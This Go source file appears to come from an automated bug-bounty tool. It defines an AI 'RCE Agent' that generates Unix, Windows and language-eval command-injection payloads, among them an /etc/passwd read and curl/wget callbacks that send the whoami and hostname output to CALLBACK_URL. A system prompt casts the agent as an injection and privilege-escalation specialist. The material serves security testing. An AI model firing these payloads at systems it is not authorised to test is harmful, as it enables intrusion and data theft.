// Package rce implements the Remote Code Execution / Command Injection specialist agent.
package rce

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "RCE Agent" }
func (a *Agent) ID() string           { return "rce" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	priority, _ := item.Payload["priority"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	payloads := generatePayloads(vulnContext)
	var findings []*base.Finding
	for _, p := range payloads {
		findings = append(findings, &base.Finding{
			Type:       "RCE",
			URL:        targetURL,
			Payload:    p.payload,
			Severity:   "critical", // RCE is always critical
			Confidence: 0.0,
			Evidence:   map[string]interface{}{"technique": p.technique, "os_target": p.osTarget},
			Method:     detectMethod(vulnContext),
		})
	}
	_ = priority
	return findings, nil
}

type rcePayload struct {
	payload   string
	technique string
	osTarget  string
}

func generatePayloads(vulnCtx string) []rcePayload {
	var payloads []rcePayload

	// OS Command Injection (Unix)
	unixPayloads := []rcePayload{
		{"; id", "semicolon_chain", "unix"},
		{"| id", "pipe_chain", "unix"},
		{"|| id", "or_chain", "unix"},
		{"& id", "background_chain", "unix"},
		{"`id`", "backtick_subst", "unix"},
		{"$(id)", "dollar_subst", "unix"},
		{"; cat /etc/passwd", "file_read", "unix"},
		{"; curl CALLBACK_URL/$(whoami)", "oob_exfil", "unix"},
		{"; wget CALLBACK_URL/$(hostname)", "oob_wget", "unix"},
		{"%0aid", "newline_inject", "unix"},
	}
	payloads = append(payloads, unixPayloads...)

	// OS Command Injection (Windows)
	winPayloads := []rcePayload{
		{"& whoami", "ampersand_chain", "windows"},
		{"| type C:\\windows\\win.ini", "pipe_file_read", "windows"},
		{"|| dir", "or_chain", "windows"},
		{"; ping -n 5 127.0.0.1", "time_delay", "windows"},
	}
	payloads = append(payloads, winPayloads...)

	// Eval injection (if context suggests dynamic eval)
	ctx := strings.ToLower(vulnCtx)
	if strings.Contains(ctx, "eval") || strings.Contains(ctx, "exec") || strings.Contains(ctx, "python") || strings.Contains(ctx, "node") {
		evalPayloads := []rcePayload{
			{"__import__('os').popen('id').read()", "python_eval", "python"},
			{"require('child_process').execSync('id').toString()", "node_eval", "node"},
			{"Runtime.getRuntime().exec('id')", "java_runtime", "java"},
			{"system('id')", "php_system", "php"},
		}
		payloads = append(payloads, evalPayloads...)
	}

	return payloads
}

func detectMethod(ctx string) string {
	if strings.Contains(strings.ToLower(ctx), "post") {
		return "POST"
	}
	return "GET"
}

const defaultSystemPrompt = `You are an elite RCE/Command Injection specialist with deep expertise in:
- OS command chaining (;, |, ||, &, &&, backticks, $())
- Eval injection (Python eval, Node.js require, PHP system)
- Encoding bypasses (URL encoding, hex, newline injection)
- Blind RCE via time delays and OOB callbacks
- Privilege escalation post-exploitation

RULES:
1. RCE is ALWAYS critical severity
2. Start with simple chaining (;id, |id), escalate to encoded variants
3. Use OOB callbacks for blind confirmation
4. Generate payloads for both Unix and Windows
5. If eval context detected, use language-specific payloads`
